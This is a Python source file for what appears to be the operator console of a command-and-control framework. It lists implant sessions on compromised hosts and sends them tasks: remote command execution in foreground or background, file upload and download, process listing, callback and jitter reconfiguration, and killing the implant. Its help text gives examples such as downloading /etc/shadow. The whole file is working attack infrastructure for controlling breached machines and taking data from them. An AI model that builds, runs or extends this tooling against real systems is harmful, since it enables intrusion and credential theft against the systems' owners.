#!/usr/bin/python3
import httpx
import shlex
import base64
import binascii
import gzip
import io
import os

from prettytable import PrettyTable
from termcolor import colored

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.styles import Style
from prompt_toolkit import print_formatted_text

# local imports
from client_helper.user_manager import fix_date
from client_helper.tasking_manager import get_tasking, send_task
from client_helper.tasking_manager import format_args

# colors for the sessions prompt
style_session = Style.from_dict(
    {
        "": "#FFFAF0",
        "host": "#f20707",
        "arrow": "#FFFAF0",
    }
)

# the prompty layout and design for the session context
message_session = [("class:host", "!session"), ("class:arrow", " > ")]

# valid commands for the session context
cmds_session = WordCompleter(
    [
        "info",
        "ls",
        "exec_fg",
        "exec_bg",
        "back",
        "upload",
        "download",
        "ps",
        "tasking",
        "view",
        "reconfig",
        "kill",
        "help",
    ]
)


def format_output(output: str) -> str:
    """
    Takes base64 encoded hex string from the lighthouse server and decodes it to a readable format.
    :param output: The base64 encoded hex string from the server
    :return: A decoded string or an error message if decoding fails
    """
    try:
        decoded_bytes = bytes.fromhex(output)
        decoded_base = base64.b64decode(decoded_bytes.decode("utf-8")).decode("utf-8")
        return decoded_base
    except (binascii.Error, UnicodeDecodeError, ValueError) as e:
        print_formatted_text(f"[*] Error decoding output: {e}")
        return ""


def format_download_output(output):
    try:
        # hex -> base64 -> gzip
        decoded_bytes = bytes.fromhex(output)
        decoded_data = base64.b64decode(decoded_bytes)
        with gzip.GzipFile(fileobj=io.BytesIO(decoded_data)) as gz:
            decompressed_data = gz.read()
        return decompressed_data.decode("utf-8", errors="replace")
    except Exception as e:
        # we had a download error and the error messages are base64 -> hex
        # call the normal viewer
        print_formatted_text(format_output(output))


def get_download_result(response: list):
    result = response.json()
    table = PrettyTable()
    table.field_names = ["ID", "Session", "Date Received", "Task", "Args"]
    id = result.get("id")
    session_id = result.get("session")
    date_received = result.get("date", "Null")
    if date_received != "Null":
        date_received_formatted = fix_date(date_received)
    else:
        date_received_formatted = "Null"
    task = result.get("task", "Null")
    args = result.get("args", "Null")
    table.add_row([id, session_id, date_received_formatted, task, args])
    print_formatted_text(table)
    output = result.get("results", "Null")
    print_formatted_text(format_download_output(output))


def get_result(token: str, server: str, session: str, id: int) -> None:
    """
    Get the result of a specific task for a session from the lighthouse server.
    :param token: The authentication token for the lighthouse server
    :param server: The lighthouse server address
    :param session: The session ID to which the task belongs
    :param id: The ID of the task result to retrieve
    :return: None
    """
    url = f"https://{server}/results/{session}/{id}"
    headers = {
        "accept": "application/json",
        "Authorization": f"Bearer {token}",
    }

    response = httpx.get(url, headers=headers, verify=False)
    if response.status_code == 404:
        print_formatted_text(f"[*] Session id {session} not found!")
    elif response.status_code == 416:
        print_formatted_text(f"[*] ID {id} not found for session {session}")
    elif (
        response.status_code == 401
        and response.json().get("detail") == "Bad Credentials"
    ):
        print_formatted_text("[*] Invalid token...time to reauthenticate")
    elif response.status_code == 200:
        result = response.json()

        if result.get("task") == "download":
            get_download_result(response)
            return

        table = PrettyTable()
        table.field_names = ["ID", "Session", "Date Received", "Task", "Args"]
        id = result.get("id")
        session_id = result.get("session")
        date_received = result.get("date", "Null")
        if date_received != "Null":
            date_received_formatted = fix_date(date_received)
        else:
            date_received_formatted = "Null"
        task = result.get("task", "Null")
        if task == "upload":
            print_formatted_text("[+] No output for upload commands")
            return
        args = result.get("args", "Null")
        table.add_row([id, session_id, date_received_formatted, task, args])
        print_formatted_text(table)
        output = result.get("results", "Null")
        print_formatted_text(format_output(output))
    else:
        print_formatted_text(response.status_code, response.text, response)


def format_sessions(sessions: list) -> None:
    """
    Formats the session data into a table for display in the merchant client.
    :param sessions: A list of session dictionaries containing session data
    :return: None
    """
    if isinstance(sessions, list):
        table = PrettyTable()
        table.field_names = [
            "Session",
            "Alive",
            "Last Seen",
            "First Seen",
            "CB Freq(m)",
            "User",
            "Hostname",
        ]
        for session in sessions:
            session_id = session.get("session", "Null")
            status = session.get("alive", "Null")
            last_seen = session.get("last_checkin", "Null")
            if last_seen != "Null":
                last_seen_formatted = fix_date(last_seen)
            first_seen = session.get("first_checkin", "Null")
            if first_seen != "Null":
                first_seen_formatted = fix_date(first_seen)
            cb_freq = session.get("callback_freq", "Null")
            user = session.get("username", "Null")
            hostname = session.get("hostname", "Null")
            table.add_row(
                [
                    session_id,
                    status,
                    last_seen_formatted,
                    first_seen_formatted,
                    cb_freq,
                    user,
                    hostname,
                ]
            )
    print_formatted_text(table)


def get_sessions(token: str, server: str) -> None:
    """
    Grab all sessions from the lighthouse server. Data will be returned in a json array,
    data is passed to format_session() to properly display the session data
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :return: None
    """
    url = f"https://{server}/implants/"
    headers = {
        "accept": "application/json",
        "Authorization": f"Bearer {token}",
    }
    try:
        response = httpx.get(url, headers=headers, verify=False)
        if (
            response.status_code == 401
            and response.json().get("detail") == "Bad Credentials"
        ):
            print_formatted_text("[*] Invalid token...time to reauthenticate")

        elif response.status_code == 200 and isinstance(response.json(), list):
            # proper json array
            format_sessions(response.json())
        else:
            print_formatted_text("[*] Invalid data format")
            print_formatted_text(response.status_code, response.text, response)
    except httpx.ConnectError as e:
        print_formatted_text("[-] Connection Refused to Lighthouse")

def test_session(token: str, server: str, session: str) -> int:
    """
    Test if a session id is a valid session (either alive or dead) with the lighthouse server
    We have this function as a pre-check before attempting to interact with an implant session
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :param session: The session id to check
    :return: None
    """
    url = f"https://{server}/implants/{session}"
    headers = {
        "accept": "application/json",
        "Authorization": f"Bearer {token}",
    }
    response = httpx.get(url, headers=headers, verify=False)
    return response.status_code


def get_session(token: str, server: str, session: str) -> int:
    """
    Get information about a specific session from the lighthouse server
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :param session: The session to retrieve information about from the lighthouse server
    :return: The status code from the lighthouse server
    """
    url = f"https://{server}/implants/{session}"
    headers = {
        "accept": "application/json",
        "Authorization": f"Bearer {token}",
    }
    response = httpx.get(url, headers=headers, verify=False)
    if response.status_code == 200:
        session = response.json()
        table = PrettyTable()
        table.field_names = [
            "Session",
            "Alive",
            "Last Seen",
            "First Seen",
            "CB Freq(m)",
            "User",
            "Hostname",
        ]

        session_id = session.get("session", "Null")
        status = session.get("alive", "Null")
        last_seen = session.get("last_checkin", "Null")
        if last_seen != "Null":
            last_seen_formatted = fix_date(last_seen)
        first_seen = session.get("first_checkin", "Null")
        if first_seen != "Null":
            first_seen_formatted = fix_date(first_seen)
        cb_freq = session.get("callback_freq", "Null")
        user = session.get("username", "Null")
        hostname = session.get("hostname", "Null")
        table.add_row(
            [
                session_id,
                status,
                last_seen_formatted,
                first_seen_formatted,
                cb_freq,
                user,
                hostname,
            ]
        )
        print_formatted_text(table)
    elif response.status_code == 404:
        print_formatted_text(f"[*] Session id {session} not found!")
    elif (
        response.status_code == 401
        and response.json().get("detail") == "Bad Credentials"
    ):
        print_formatted_text("[*] Invalid token...time to reauthenticate")
    elif response.status_code == 410:
        print_formatted_text(f"[*] {response.json().get("detail")}")

    else:
        print_formatted_text(response.status_code, response.text, response)
    return response.status_code


def interact_implant(token: str, server: str, session_id: str) -> None:
    """
    Main interact loop to swap context into a specific implant session. Used to take in user input from the tasking
    context and pass it to the session_router() function for validation and shipping to the lighthouse server.
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :param session_id: The session id to interact with
    :return: None
    """
    interact = PromptSession()
    while True:
        options = interact.prompt(
            message=message_session, style=style_session, completer=cmds_session
        )
        options = options.lower().strip()
        try:
            parsed = shlex.split(options)
        except ValueError as e:
            print_formatted_text(f"[*] Input parsing error: {e}")
            continue

        if not parsed:
            continue

        cmd = parsed[0].lower()
        args = parsed[1:]

        if cmd == "back":
            # drop back to the server context (leave implant context)
            return

        session_router(cmd, args, token, server, session_id)


def session_router(
    cmd: str, args: list, token: str, server: str, session_id: str
) -> None:
    """
    The session router that will take user input and ensure it is a valid command. It will then pass the
    validated command to the correct function for shipping to the lighthouse server
    :param cmd: The command the user wishes to enter
    :param args: The arguments for the base command
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :param session_id: The session id the tasking should be tied to
    :return: None
    """
    match cmd:
        case "info":
            get_session(token, server, session_id)
        case "ls":
           handle_ls(token, server, session_id, args) 
        case "tasking":
            get_tasking(token, session_id, server)
        case "ps":
            send_task(token, server, session_id, "ps", "")
        case "exec_fg":
           handle_exec_fg(token, server, session_id, args) 
        case "exec_bg":
           handle_exec_bg(token, server, session_id, args) 
        case "reconfig":
           handle_reconfig(token, server, session_id, args) 
        case "view":
           handle_view(token, server, session_id, args) 
        case "kill":
           handle_kill(token, server, session_id) 
        case "download":
           handle_download(token, server, session_id, args) 
        case "upload":
           handle_upload(token, server, session_id, args) 
        case "help":
            handle_help(args)


def handle_help(args: list):
    if len(args) == 0:
        print_formatted_text("[-] Error: expecting 'help <cmd>'")
        return

    command_help = args[0]
    match command_help:
        case "info":
            print_info_help()
        case "ls":
            print_ls_help()
        case "tasking":
            print_tasking_help()
        case "ps":
            print_process_list_help()
        case "exec_fg":
            print_exec_fg_help()
        case "exec_bg":
            print_exec_fg_help()
        case "reconfig":
            print_reconfig_help()
        case "view":
            print_view_help()
        case "kill":
            print_kill_help()
        case "download":
            print_download_help()
        case "upload":
            print_upload_help()


def print_info_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|              INFO HELP                 |")
    print_formatted_text("------------------------------------------")
    print(colored("info", attrs=["bold"])+" - See basic imlant information")
    print(colored("help info", attrs=["bold"])+" - See this help menu")
    print_formatted_text("------------------------------------------")


def print_ls_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|                LS HELP                 |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("ls - See directory listing")
    print_formatted_text("\tExample: ls /")
    print_formatted_text("\thelp ls - See this help menu")
    print_formatted_text("------------------------------------------")

  
def print_tasking_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|           TASKING HELP                 |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("tasking - See pending and completed implant tasks")
    print_formatted_text("\tExample: tasking")
    print_formatted_text("\thelp tasking - See this help menu")
    print_formatted_text("------------------------------------------")


def print_process_list_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|              PS HELP                   |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("info - See process listing")
    print_formatted_text("\thelp ps - See this help menu")
    print_formatted_text("------------------------------------------")


def print_exec_bg_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|            EXEC_BG HELP                |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("exec_bg - Execute command without stdout / stderr returned")
    print_formatted_text("\tExample:  exec_bg '/usr/bin/implant'")
    print_formatted_text("\thelp exec_bg - See this help menu")
    print_formatted_text("------------------------------------------")


def print_exec_fg_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|           EXEC_FG HELP                 |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("exec_fg - Execute command with stdout / stderr returned")
    print_formatted_text("\tExample: exec_fg \"/bin/sh -c 'uname -a'\"")
    print_formatted_text("\t exec_fg \"exec_fg 'netstat -antpu'")
    print_formatted_text("\thelp exec_fg - See this help menu")
    print_formatted_text("------------------------------------------")


def print_reconfig_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|           RECONFIG HELP                |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("reconfig - Change implant callback interval, jitter, max errors")
    print_formatted_text("\tExample:  reconfig <cb interval> <jitter> <max errors>")
    print_formatted_text("\thelp reconfig - See this help menu")
    print_formatted_text("------------------------------------------")

def print_view_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|              VIEW HELP                 |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("view - View results of an implant task")
    print_formatted_text("\tExample:  view <task-id>")
    print_formatted_text("\thelp view - See this help menu")
    print_formatted_text("------------------------------------------")


def print_kill_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|              KILL HELP                 |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("kill - Terminate the running agent process")
    print_formatted_text("\tExample:  kill")
    print_formatted_text("\thelp kill - See this help menu")
    print_formatted_text("------------------------------------------")


def print_download_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|           DOWNLOAD HELP                |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("download - Download remote file from target")
    print_formatted_text("\tExample:  download /etc/shadow")
    print_formatted_text("\thelp download - See this help menu")
    print_formatted_text("------------------------------------------")

def print_upload_help():
    print_formatted_text("------------------------------------------")
    print_formatted_text("|             UPLOAD HELP                |")
    print_formatted_text("------------------------------------------")
    print_formatted_text("upload - Upload local file to the target")
    print_formatted_text("\tExample:  upload /path/loca.txt /path/remote.txt")
    print_formatted_text("\thelp upload - See this help menu")
    print_formatted_text("------------------------------------------")



def handle_ls(token: str, server: str, session_id: str, args: list) -> None:
    if len(args) == 1:
        send_task(token, server, session_id, "ls", args[0])
    else:
        send_task(token, server, session_id, "ls", "")


def handle_exec_fg(token: str, server: str, session_id: str, args: list) -> None:
    if len(args) == 1:
        send_task(token, server, session_id, "exec_fg", args[0])
    else:
        print_formatted_text("[*] Expecting command -> exec_fg '<command>'")


def handle_exec_bg(token: str, server: str, session_id: str, args: list):
    if len(args) == 1:
        send_task(token, server, session_id, "exec_bg", args[0])
    else:
        print_formatted_text("[*] Expecting command -> exec_bg '<command>'")


def handle_reconfig(token: str, server: str, session_id: str, args: list) -> None:
    # ensure we have all arguments
    if len(args) != 3:
        print_formatted_text("[*] Expecting reconfig <callback freq> <jitter> <max errors>")
        return
    
    if not validate_reconfig(args):
        print_formatted_text("[*] Expecting int values for <callback freq> <jitter> <max errors>")
        return

    if not validate_reconfig_values(args):
        return

    send_task(token, server, session_id, "reconfig", " ".join(args[0:]))


def handle_view(token: str, server: str, session_id: str, args: list) -> None:
    if len(args) == 1:
        get_result(token, server, session_id, int(args[0]))
    else:
        print_formatted_text("[*] Expecting task id -> view <task id>")


def handle_kill(token: str, server: str, session_id: str) -> None:
    print_formatted_text(f"[!!!] Are you sure you want to terminate {session_id}: [y/N]")
    get_choice = input("--> ")
    if get_choice.upper() == "" or get_choice.upper() == "N":
        return
    elif get_choice.upper() == "Y":
        send_task(token, server, session_id, "kill", "")


def handle_download(token:str, server: str, session_id: str, args: list) -> None:
    if len(args) == 1:
        send_task(token, server, session_id, "download", args[0])
    else:
        print_formatted_text("[*] Expecting command -> download '/full/path/src.txt'")


def handle_upload(token: str, server: str, session_id: str, args: list) -> None:
    if len(args) == 2:
        # get binary formatted properly and ship it here as args[0]
        # we also should specify what to name it likely need another arg here
        dst_path = format_args(args[1])
        success, binary_to_send = process_upload_binary(args[0])
        if success:
            send_task(token, server, session_id, "upload", dst_path + ":" + binary_to_send)
            return
        else:
            print_formatted_text("[*] Expecting command -> upload '/full/path/src.txt' '/full/path/dst.txt'")


def format_upload_binary(bin_contents: bytes) -> str:
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb") as gz:
        gz.write(bin_contents)
    compressed_bytes = buf.getvalue()
    base64_bytes = base64.b64encode(compressed_bytes)
    return base64_bytes.hex()


def process_upload_binary(file_path: str) -> tuple[bool, str]:
    if not os.path.exists(file_path):
        print_formatted_text(f"[!!!] {file_path} no such file or directory")
        return False, ""
    try:
        with open(file_path, "rb") as fp:
            contents = fp.read()
            final_bin = format_upload_binary(contents)
        return True, final_bin  # <-- return string

    except Exception as e:
        print_formatted_text(f"[!!!] {e}")
        return False, ""


def validate_reconfig_values(args):
    if int(args[0]) < 1:
        print_formatted_text("[*] Cannot set callbacks to lower than one minute")
        return False
    if int(args[1]) > 100 or int(args[1]) < 1:
        print_formatted_text(
            "[*] Jitter is a % of call back frequency, cannot be outside 0-100"
        )
        return False
    if int(args[2]) < 5:
        print_formatted_text(
            "[*] Cannot except a max errors before self terminate lower than 5"
        )
        return False
    return True


# we dont validate these args on the implant side to try and
# keep the size of agent code down, so really validate here
def validate_reconfig(args) -> bool:
    for arg in args:
        try:
            int(arg)
        except ValueError:
            return False
    return True
